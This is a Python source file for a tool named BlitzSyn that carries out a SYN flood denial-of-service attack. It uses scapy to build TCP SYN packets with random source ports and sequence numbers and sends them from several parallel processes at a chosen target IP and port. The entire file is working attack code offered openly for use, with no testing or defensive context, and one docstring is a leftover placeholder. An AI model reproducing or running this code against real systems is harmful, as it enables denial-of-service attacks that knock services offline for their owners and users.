import multiprocessing
from scapy.all import send, IP, TCP
import random

class BlitzSyn:
    """
    This class implements a SYN flood attack. It sends a large number of SYN packets to a specified target IP and port
    using multiple processes to increase the speed and efficiency of the attack.
    """
    def __init__(self, target_ip, target_port):
        """
        Initializes the BlitzSyn object with the target IP and port.

        :param target_ip: The IP address of the target machine.
        :param target_port: The port number of the target machine.
        """
        self.target_ip = target_ip
        self.target_port = target_port


    def _send_syn_packet(self):
        """
        Constructs and sends a single SYN packet to the target IP and port.
        Randomizes the source port and sequence number to simulate different sessions.
        """
        ip_layer = IP(dst=self.target_ip)
        tcp_layer = TCP(sport=random.randint(1024, 65535), dport=self.target_port, flags='S', seq=random.randint(0, 4294967295))
        packet = ip_layer / tcp_layer
        send(packet, verbose=False)


    def _worker(self, packets):
        """
        Sends a specified number of SYN packets in a single process.

        :param packets: The number of SYN packets to send.
        """
        for _ in range(packets):
            self._send_syn_packet()


    def attack(self, workers=10, packets_per_worker=100):
        """
        There are going to be some comments
        """
        print(f"Starting SYN flood attack on {self.target_ip}:{self.target_port} with {workers} workers.")
        processes = []
        for _ in range(workers):
            process = multiprocessing.Process(target=self._worker, args=(packets_per_worker,))
            processes.append(process)
            process.start()

        for process in processes:
            process.join()
        print("SYN flood attack completed.")
